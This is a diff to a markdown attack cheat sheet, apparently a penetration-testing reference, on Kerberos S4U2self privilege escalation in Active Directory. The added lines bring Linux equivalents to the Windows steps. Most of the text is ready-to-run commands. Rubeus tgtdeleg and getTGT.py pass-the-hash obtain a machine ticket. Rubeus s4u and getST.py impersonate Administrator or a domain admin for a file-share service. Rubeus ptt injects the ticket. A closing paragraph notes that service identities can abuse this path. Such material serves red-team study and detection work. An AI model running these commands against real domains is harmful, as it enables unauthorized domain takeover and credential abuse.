@@ -5,15 +5,22 @@
 
 ## S4U2self - Privilege Escalation
 
-1. Get a TGT 
+1. Get a TGT
     * Using Unconstrained Delegation
     * Using the current machine account: `Rubeus.exe tgtdeleg /nowrap`
+    * Using credentials: `getTGT.py -dc-ip "$DC_IP" -hashes :"$NT_HASH" "$DOMAIN"/"machine$"`
 2. Use that TGT to make a S4U2self request in order to obtain a Service Ticket as domain admin for the machine.
+
     ```ps1
+    # Windows
     Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001.domain.local" /ticket:"base64ticket"
     Rubeus.exe ptt /ticket:"base64ticket"
 
     Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"base64ticket" /ptt
+
+    # Linux
+    export KRB5CCNAME="/path/to/ticket.ccache"
+    getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" -k -no-pass -dc-ip "DomainController" "domain.local"/'machine$'
     ```
 
 The "Network Service" account and the AppPool identities can act as the computer account in terms of Active Directory, they are only restrained locally. Therefore it is possible to invoke S4U2self if you run as one of these and request a service ticket for any user (e.g. someone with local admin rights, like DA) to yourself.
